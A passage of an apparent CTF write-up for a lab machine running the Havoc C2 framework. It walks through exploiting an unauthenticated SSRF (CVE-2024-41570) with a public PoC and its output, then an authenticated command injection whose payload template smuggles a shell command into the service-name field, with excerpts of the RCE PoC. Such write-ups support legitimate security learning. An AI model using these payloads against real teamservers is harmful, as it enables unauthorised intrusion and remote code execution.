href="/cheatsheets/404#nginx">default nginx 404</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250124133226450.webp" /> <img loading="lazy" src="/img/image-20250124133226450.png" alt="image-20250124133226450" class="include_image " /> </picture> <h4 id="tech-stack">Tech Stack</h4> <p>The HTTP response headers show an interesting header besides the <code class="language-plaintext highlighter-rouge">Server</code>:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> <span class="ne">Not Found</span> <span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.22.1</span> <span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 24 Jan 2025 18:33:17 GMT</span> <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span> <span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span> <span class="na">X-Havoc</span><span class="p">:</span> <span class="s">true</span> <span class="na">Content-Length</span><span class="p">:</span> <span class="s">146</span> </code></pre></div></div> <p>Searching in <a href="https://grep.app/search?q=x-havoc">grep.app</a> for <code class="language-plaintext highlighter-rouge">X-Havoc</code> shows a pretty solid match on Havoc:</p> <picture> <source type="image/webp" srcset="/img/image-20250124133509255.webp" /> <img loading="lazy" src="/img/image-20250124133509255.png" alt="image-20250124133509255" class="include_image " /> </picture> <p><a href="https://github.com/HavocFramework/Havoc">Havoc</a> is a Go-based post-exploitation C2 framework.</p> <p>Brute forcing directories with <code class="language-plaintext highlighter-rouge">feroxbuster</code> doesn’t find anything interesting.</p> <h3 id="http---tcp-8000">HTTP - TCP 8000</h3> <p>The site on port 8000 is just a directory listing with two files:</p> <picture> <source type="image/webp" srcset="/img/image-20250124133821473.webp" /> <img loading="lazy" src="/img/image-20250124133821473.png" alt="image-20250124133821473" class="include_image " /> </picture> <p><code class="language-plaintext highlighter-rouge">disable_tls.patch</code> is a <a href="https://en.wikipedia.org/wiki/Patch_(Unix)">patch file</a> for the websocket post in Havoc to not require TLS:</p> <div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Disable TLS for Websocket management port 40056, so I can prove that</span><span class="err"> </span><span class="go">sergej is not doing any work</span><span class="err"> </span><span class="go">Management port only allows local connections (we use ssh forwarding) so </span><span class="err"> </span><span class="go">this will not compromise our teamserver</span><span class="err"> </span><span class="go">diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc</span><span class="err"> </span><span class="go">index abdf1b5..6be76fb 100644</span><span class="err"> </span><span class="diff-removed">--- a/client/src/Havoc/Connector.cc</span><span class="err"> </span><span class="diff-added">+++ b/client/src/Havoc/Connector.cc</span><span class="err"> </span><span class="diff-lines">@@ -8,12 +8,11 @@</span><span class="go"> Connector::Connector( Util::ConnectionInfo* ConnectionInfo )</span><span class="err"> </span><span class="go"> {</span><span class="err"> </span><span class="go"> Teamserver = ConnectionInfo;</span><span class="err"> </span><span class="go"> Socket = new QWebSocket();</span><span class="err"> </span><span class="diff-removed">- auto Server = "wss://" + Teamserver-&gt;Host + ":" + this-&gt;Teamserver-&gt;Port + "/havoc/";</span><span class="err"> </span><span class="diff-added">+ auto Server = "ws://" + Teamserver-&gt;Host + ":" + this-&gt;Teamserver-&gt;Port + "/havoc/";</span><span class="err"> </span><span class="go"> auto SslConf = Socket-&gt;sslConfiguration();</span><span class="err"> </span><span class="go"> </span><span class="err"> </span><span class="go"> /* ignore annoying SSL errors */</span><span class="err"> </span><span class="go"> SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );</span><span class="err"> </span><span class="diff-removed">- Socket-&gt;setSslConfiguration( SslConf );</span><span class="err"> </span><span class="go"> Socket-&gt;ignoreSslErrors();</span><span class="err"> </span><span class="go"> </span><span class="err"> </span><span class="go"> QObject::connect( Socket, &amp;QWebSocket::binaryMessageReceived, this, [&amp;]( const QByteArray&amp; Message )</span><span class="err"> </span><span class="go">diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go</span><span class="err"> </span><span class="go">index 9d1c21f..59d350d 100644</span><span class="err"> </span><span class="diff-removed">--- a/teamserver/cmd/server/teamserver.go</span><span class="err"> </span><span class="diff-added">+++ b/teamserver/cmd/server/teamserver.go</span><span class="err"> </span><span class="diff-lines">@@ -151,7 +151,7 @@</span><span class="go"> func (t *Teamserver) Start() {</span><span class="err"> </span><span class="go"> }</span><span class="err"> </span><span class="go"> </span><span class="err"> </span><span class="go"> // start the teamserver</span><span class="err"> </span><span class="diff-removed">- if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {</span><span class="err"> </span><span class="diff-added">+ if err = t.Server.Engine.Run(Host+":"+Port); err != nil {</span><span class="err"> </span><span class="go"> logger.Error("Failed to start websocket: " + err.Error())</span><span class="err"> </span><span class="go"> }</span><span class="err"> </span></code></pre></div></div> <p>There’s a note here about catching a coworker being lazy, but more importantly a hint to access the management port 40056 only on localhost.</p> <p>The other file is a <code class="language-plaintext highlighter-rouge">.yaotl</code> file, which is the <a href="https://havocframework.com/docs/profiles">configuration language used by Havoc</a>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Teamserver <span class="o">{</span> Host <span class="o">=</span> <span class="s2">"127.0.0.1"</span> Port <span class="o">=</span> 40056 Build <span class="o">{</span> Compiler64 <span class="o">=</span> <span class="s2">"data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"</span> Compiler86 <span class="o">=</span> <span class="s2">"data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"</span> Nasm <span class="o">=</span> <span class="s2">"/usr/bin/nasm"</span> <span class="o">}</span> <span class="o">}</span> Operators <span class="o">{</span> user <span class="s2">"ilya"</span> <span class="o">{</span> Password <span class="o">=</span> <span class="s2">"CobaltStr1keSuckz!"</span> <span class="o">}</span> user <span class="s2">"sergej"</span> <span class="o">{</span> Password <span class="o">=</span> <span class="s2">"1w4nt2sw1tch2h4rdh4tc2"</span> <span class="o">}</span> <span class="o">}</span> Demon <span class="o">{</span> Sleep <span class="o">=</span> 2 Jitter <span class="o">=</span> 15 TrustXForwardedFor <span class="o">=</span> <span class="nb">false </span>Injection <span class="o">{</span> Spawn64 <span class="o">=</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">notepad.exe"</span> Spawn32 <span class="o">=</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">SysWOW64</span><span class="se">\\</span><span class="s2">notepad.exe"</span> <span class="o">}</span> <span class="o">}</span> Listeners <span class="o">{</span> Http <span class="o">{</span> Name <span class="o">=</span> <span class="s2">"Demon Listener"</span> Hosts <span class="o">=</span> <span class="o">[</span> <span class="s2">"backfire.htb"</span> <span class="o">]</span> HostBind <span class="o">=</span> <span class="s2">"127.0.0.1"</span> PortBind <span class="o">=</span> 8443 PortConn <span class="o">=</span> 8443 HostRotation <span class="o">=</span> <span class="s2">"round-robin"</span> Secure <span class="o">=</span> <span class="nb">true</span> <span class="o">}</span> <span class="o">}</span> </code></pre></div></div> <p>There are a couple users and passwords in the file, as well as the domain <code class="language-plaintext highlighter-rouge">backfire.htb</code>, and several ports listening on localhost.</p> <h2 id="shell-as-ilya">Shell as ilya</h2> <h3 id="strategy">Strategy</h3> <p>The foothold expliotation path is a bit complex, so I’ll give an overview of it before going into the particulars. I’ll blur this section for anyone not wanting to spoil what’s coming.</p> <div class="blurable"><p>Getting user involves chaining together two exploits in Havor, an unauthenticated server-side request forgery (SSRF), and an authenticated command injection remote code execution (RCE). The SSRF provides the authenticated access to the RCE vulnerability.</p> <p>When Backfire released on HTB, there were POC scripts for both the SSRF and for the RCE exploits. The SSRF one works as is on Backfire, but the RCE exploit is designed to go directly to the target. The challenge in Backfire was to take the RCE script and figure out how to use the SSRF to send the same payloads to target.</p> <p>Within days of Backfire's release, there were new POCs publicly available to chain these two exploits, but I'll skip those since they weren't available at the time I was originally solving the box, and it's a fun challenge to combine them, and show the challenge as it was on release day. </p></div> <h3 id="ssrf">SSRF</h3> <h4 id="identify-cve-2024-41570">Identify CVE-2024-41570</h4> <p>Searching for “Havoc CVE” leads to CVE-2024-41570:</p> <picture> <source type="image/webp" srcset="/img/image-20250124134532894.webp" /> <img loading="lazy" src="/img/image-20250124134532894.png" alt="image-20250124134532894" class="include_image " /> </picture> <h4 id="background">Background</h4> <p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41570">NVD page</a> describes the vulnerability as:</p> <blockquote> <p>An Unauthenticated Server-Side Request Forgery (SSRF) in demon callback handling in Havoc 2 0.7 allows attackers to send arbitrary network traffic originating from the team server.</p> </blockquote> <p>A <a href="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/">full writeup</a> is available from chebuya’s (one of the authors of Backfile) blog, and it goes into a ton of detail. I’ll give a higher level overview here.</p> <p>In Havoc, the default malware / agent is called a demon. The actor on the Havoc server will create listeners (typically HTTP(S)), which the demon’s connect to.</p> <p>When the demon connects to a listener, it accesses a command by a 32-bit int. For example, 99 is DEMON_INITIALIZE, as seen in the <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/payloads/Demon/include/core/Command.h#L38">source here</a>, or in the POC exploit script <a href="https://github.com/chebuya/Havoc-C2-SSRF-poc/blob/main/exploit.py#L58-L83">here</a> in the <code class="language-plaintext highlighter-rouge">register_agent</code> function:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">register_agent</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">domain_name</span><span class="p">,</span> <span class="n">internal_ip</span><span class="p">,</span> <span class="n">process_name</span><span class="p">,</span> <span class="n">process_id</span><span class="p">):</span> <span class="c1"># DEMON_INITIALIZE / 99 </span> <span class="n">command</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x00\x63</span><span class="sh">"</span> <span class="n">request_id</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x00\x00\x01</span><span class="sh">"</span> <span class="n">demon_id</span> <span class="o">=</span> <span class="n">agent_id</span> <span class="n">hostname_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">hostname</span><span class="p">))</span> <span class="n">username_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">username</span><span class="p">))</span> <span class="n">domain_name_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">domain_name</span><span class="p">))</span> <span class="n">internal_ip_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">internal_ip</span><span class="p">))</span> <span class="n">process_name_length</span> <span class="o">=</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">process_name</span><span class="p">)</span> <span class="o">-</span> <span class="mi">6</span><span class="p">)</span> <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xab</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">100</span> <span class="n">header_data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">request_id</span> <span class="o">+</span> <span class="n">AES_Key</span> <span class="o">+</span> <span class="n">AES_IV</span> <span class="o">+</span> <span class="n">demon_id</span> <span class="o">+</span> <span class="n">hostname_length</span> <span class="o">+</span> <span class="n">hostname</span> <span class="o">+</span> <span class="n">username_length</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="n">domain_name_length</span> <span class="o">+</span> <span class="n">domain_name</span> <span class="o">+</span> <span class="n">internal_ip_length</span> <span class="o">+</span> <span class="n">internal_ip</span> <span class="o">+</span> <span class="n">process_name_length</span> <span class="o">+</span> <span class="n">process_name</span> <span class="o">+</span> <span class="n">process_id</span> <span class="o">+</span> <span class="n">data</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">12</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">header_data</span><span class="p">)</span> <span class="n">size_bytes</span> <span class="o">=</span> <span class="n">size</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span> <span class="n">agent_header</span> <span class="o">=</span> <span class="n">size_bytes</span> <span class="o">+</span> <span class="n">magic</span> <span class="o">+</span> <span class="n">agent_id</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[***] Trying to register agent...</span><span class="sh">"</span><span class="p">)</span> <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">teamserver_listener_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">agent_header</span> <span class="o">+</span> <span class="n">header_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[***] Success!</span><span class="sh">"</span><span class="p">)</span> <span class="k">else</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!!!] Failed to register agent - </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span> </code></pre></div></div> <p>The vast majority of these commands are authenticated. Only if the listener issues a command to do something will it process the command from the demon in response. This is checked with the <code class="language-plaintext highlighter-rouge">IsKnownRequestID</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/agent/agent.go#L609-L629">function</a> in Havoc in the <code class="language-plaintext highlighter-rouge">TaskDispatch</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/agent/demons.go#L2290">function</a>:</p> <div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span><span class="n">Agent</span><span class="p">)</span> <span class="n">TaskDispatch</span><span class="p">(</span><span class="n">RequestID</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">CommandID</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">Parser</span> <span class="o">*</span><span class="n">parser</span><span class="o">.</span><span class="n">Parser</span><span class="p">,</span> <span class="n">teamserver</span> <span class="n">TeamServer</span><span class="p">)</span> <span class="p">{</span> <span class="k">var</span> <span class="n">NameID</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">strconv</span><span class="o">.</span><span class="n">ParseInt</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">NameID</span><span class="p">,</span> <span class="m">16</span><span class="p">,</span> <span class="m">64</span><span class="p">)</span> <span class="n">AgentID</span> <span class="o">:=</span> <span class="kt">int</span><span class="p">(</span><span class="n">NameID</span><span class="p">)</span> <span class="c">/* if the RequestID was not generated by the TS, reject the request */</span> <span class="k">if</span> <span class="n">a</span><span class="o">.</span><span class="n">IsKnownRequestID</span><span class="p">(</span><span class="n">teamserver</span><span class="p">,</span> <span class="n">RequestID</span><span class="p">,</span> <span class="n">CommandID</span><span class="p">)</span> <span class="o">==</span> <span class="no">false</span> <span class="p">{</span> <span class="n">logger</span><span class="o">.</span><span class="n">Warn</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity"</span><span class="p">,</span> <span class="n">AgentID</span><span class="p">,</span> <span class="n">CommandID</span><span class="p">,</span> <span class="n">RequestID</span><span class="p">))</span> <span class="k">return</span> <span class="p">}</span> <span class="k">switch</span> <span class="n">CommandID</span> <span class="p">{</span> <span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span> </code></pre></div></div> <p>However, at the top of <code class="language-plaintext highlighter-rouge">IsKnownRequestID</code>, there are a couple exceptions:</p> <div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// check that the request the agent is valid</span> <span class="k">func</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span><span class="n">Agent</span><span class="p">)</span> <span class="n">IsKnownRequestID</span><span class="p">(</span><span class="n">teamserver</span> <span class="n">TeamServer</span><span class="p">,</span> <span class="n">RequestID</span> <span class="kt">uint32</span><span class="p">,</span> <span class="n">CommandID</span> <span class="kt">uint32</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span> <span class="c">// some commands are always accepted because they don't follow the "send task and get response" format</span> <span class="k">switch</span> <span class="n">CommandID</span> <span class="p">{</span> <span class="k">case</span> <span class="n">COMMAND_SOCKET</span><span class="o">:</span> <span class="k">return</span> <span class="no">true</span> <span class="k">case</span> <span class="n">COMMAND_PIVOT</span><span class="o">:</span> <span class="k">return</span> <span class="no">true</span> <span class="p">}</span> <span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span> </code></pre></div></div> <p>If the command is <code class="language-plaintext highlighter-rouge">COMMAND_SOCKET</code> or <code class="language-plaintext highlighter-rouge">COMMAND_PIVOT</code>, then this just returns true. This means that the demon can contact the C2 with one of these commands and it doesn’t matter that it never issued a request for it. The reason is that these are used for proxying data and creating tunnels.</p> <p>With these commands, the researcher was able to generate a SSRF.</p> <h4 id="run-poc">Run POC</h4> <p>The second link in the search above is a <a href="https://github.com/chebuya/Havoc-C2-SSRF-poc">POC on GitHub</a>, which is associated with the blog post. I’ll save a copy of the script. It doesn’t document what libraries are needed, but it turns out it’s <code class="language-plaintext highlighter-rouge">requests</code> and <code class="language-plaintext highlighter-rouge">pycryptodome</code>. I’ll add these with <code class="language-plaintext highlighter-rouge">uv</code> (check out the <a href="/cheatsheets/uv#">uv cheatsheet</a> for details):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv add <span class="nt">--script</span> exploit.py requests pycryptodome <span class="go">Updated `exploit.py` </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py <span class="go">Installed 6 packages in 8ms usage: exploit.py [-h] -t TARGET -i IP -p PORT [-A USER_AGENT] [-H HOSTNAME] [-u USERNAME] [-d DOMAIN_NAME] [-n PROCESS_NAME] [-ip INTERNAL_IP] exploit.py: error: the following arguments are required: -t/--target, -i/--ip, -p/--port </span></code></pre></div></div> <p>I’ll give the script the target as well as a reference to the IP and port to make a request to (my HTB VPN IP):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 10.10.14.6 <span class="nt">-p</span> 80 <span class="go">[***] Trying to register agent... [***] Success! [***] Trying to open socket on the teamserver... [***] Success! [***] Trying to write to the socket [***] Success! [***] Trying to poll teamserver for socket output... [***] Read socket output successfully! HTTP/1.0 404 File not found Server: SimpleHTTP/0.6 Python/3.12.3 Date: Fri, 24 Jan 2025 18:51:43 GMT Connection: close Content-Type: text/html;charset=utf-8 Content-Length: 335 &lt;!DOCTYPE HTML&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Error response&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error response&lt;/h1&gt; &lt;p&gt;Error code: 404&lt;/p&gt; &lt;p&gt;Message: File not found.&lt;/p&gt; &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; </span></code></pre></div></div> <p>On my Python webserver, there’s a request for <code class="language-plaintext highlighter-rouge">/vulnerable</code>, which returns the 404 response shown above:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>python <span class="nt">-m</span> http.server 80 <span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.49 - - [24/Jan/2025 13:51:43] code 404, message File not found 10.10.11.49 - - [24/Jan/2025 13:51:43] "GET /vulnerable HTTP/1.1" 404 - </span></code></pre></div></div> <h4 id="enumerating">Enumerating</h4> <p>With this SSRF, I’ll try to read the management port mentioned above:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 127.0.0.1 <span class="nt">-p</span> 40056 <span class="go">...[snip]... HTTP/1.1 404 Not Found Content-Type: text/plain Date: Fri, 24 Jan 2025 18:59:07 GMT Content-Length: 18 Connection: close 404 page not found </span></code></pre></div></div> <p>The two filtered ports, 5000 and 7096, both return empty responses.</p> <h3 id="authenticated-rce">Authenticated RCE</h3> <h4 id="identify">Identify</h4> <p>A bit more searching leads to a post from Include Security, <a href="https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/">Vulnerabilities in Open Source C2 Frameworks</a>. It’s a bit of an overview style, without going into a ton of detail. But in the section on Havoc, there’s mention of an authenticated RCE exploit:</p> <blockquote> <p>Havoc has an authenticated RCE vulnerability in the teamserver that is similar to the one in Sliver. Further, the <a href="https://github.com/HavocFramework/Havoc/blob/main/profiles/havoc.yaotl#L12">default Havoc configuration</a> creates two users with the password “password1234”, so anyone careless enough to run Havoc with default settings on an untrusted network can immediately be exploited by this RCE vulnerability. Teamservers that are firewalled off can still be hit due to a cool <a href="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/">SSRF vulnerability</a> discovered by chebuya recently.</p> </blockquote> <p>The description even mentions the SSRF exploit I’ve already exploited! There’s more detail:</p> <blockquote> <p>An injection payload into the service name field looks something like <code class="language-plaintext highlighter-rouge">\" -mbla; CMD 1&gt;&amp;2 &amp;&amp; false #</code>:</p> <ul> <li><code class="language-plaintext highlighter-rouge">\"</code> to exit out the quotes</li> <li><code class="language-plaintext highlighter-rouge">-mbla</code> to cause the MinGW compilation to fail and not have to wait for it</li> <li><code class="language-plaintext highlighter-rouge">CMD 1&gt;&amp;2</code> with the chosen payload redirected to stderr</li> <li><code class="language-plaintext highlighter-rouge">&amp;&amp; false</code> to cause the command to fail and the server to send back the stderr output</li> <li><code class="language-plaintext highlighter-rouge">#</code> to comment out the parameters after our injection</li> </ul> </blockquote> <p>There’s a <a href="https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/havoc_auth_rce/havoc_rce.py">POC script</a> as well.</p> <p>The vulnerability is in the code that handles building binaries to deploy to demons. The <code class="language-plaintext highlighter-rouge">builder.go</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/common/builder/builder.go#L78">file</a> is entirely devoted to generating the correct command line string necessary to compile something, eventually passed to <code class="language-plaintext highlighter-rouge">exec</code> in the <code class="language-plaintext highlighter-rouge">Cmd</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/common/builder/builder.go#L1064-L1088">function</a>:</p> <div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">b</span> <span class="o">*</span><span class="n">Builder</span><span class="p">)</span> <span class="n">Cmd</span><span class="p">(</span><span class="n">cmd</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span> <span class="k">var</span> <span class="p">(</span> <span class="n">Command</span> <span class="o">=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">stdout</span> <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span> <span class="n">stderr</span> <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span> <span class="n">err</span> <span class="kt">error</span> <span class="p">)</span> <span class="n">Command</span><span class="o">.</span><span class="n">Dir</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">sourcePath</span> <span class="n">Command</span><span class="o">.</span><span class="n">Stdout</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stdout</span> <span class="n">Command</span><span class="o">.</span><span class="n">Stderr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stderr</span> <span class="n">err</span> <span class="o">=</span> <span class="n">Command</span><span class="o">.</span><span class="n">Run</span><span class="p">()</span> <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span> <span class="n">logger</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="s">"Couldn't compile implant: "</span> <span class="o">+</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span> <span class="k">if</span> <span class="o">!</span><span class="n">b</span><span class="o">.</span><span class="n">silent</span> <span class="p">{</span> <span class="n">b</span><span class="o">.</span><span class="n">SendConsoleMessage</span><span class="p">(</span><span class="s">"Error"</span><span class="p">,</span> <span class="s">"couldn't compile implant: "</span><span class="o">+</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span> <span class="n">b</span><span class="o">.</span><span class="n">SendConsoleMessage</span><span class="p">(</span><span class="s">"Error"</span><span class="p">,</span> <span class="s">"compile output: "</span><span class="o">+</span><span class="n">stderr</span><span class="o">.</span><span class="n">String</span><span class="p">())</span> <span class="p">}</span> <span class="n">logger</span><span class="o">.</span><span class="n">Debug</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="n">logger</span><span class="o">.</span><span class="n">Debug</span><span class="p">(</span><span class="s">"StdErr:</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">stderr</span><span class="o">.</span><span class="n">String</span><span class="p">())</span> <span class="k">return</span> <span class="no">false</span> <span class="p">}</span> <span class="k">return</span> <span class="no">true</span> <span class="p">}</span> </code></pre></div></div> <p>Because it’s just joining a bunch of strings, we have an opportunity for command injection. Many of the parameters are sanitized, but the service name parameter is not.</p> <p>To exploit this, I’ll need to connect to the admin websocket, which is blocked by the firewall. I’ll have to use the SSRF above to generate that traffic.</p> <h4 id="breakdown">Breakdown</h4> <p>The RCE POC Python script creates a web socket and then sends three requests into it. The creation looks like:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ws</span> <span class="o">=</span> <span class="nf">create_connection</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">wss://</span><span class="si">{</span><span class="n">HOSTNAME</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">/havoc/</span><span class="sh">"</span><span class="p">,</span> <span class="n">sslopt</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">cert_reqs</span><span class="sh">"</span><span class="p">:</span> <span class="n">ssl</span><span class="p">.</span><span class="n">CERT_NONE</span><span class="p">,</span> <span class="sh">"</span><span class="s">check_hostname</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span> </code></pre></div></div> <p>The first websocket message is to authenticate:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha3_256</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:40:17</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">}}</span> <span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span 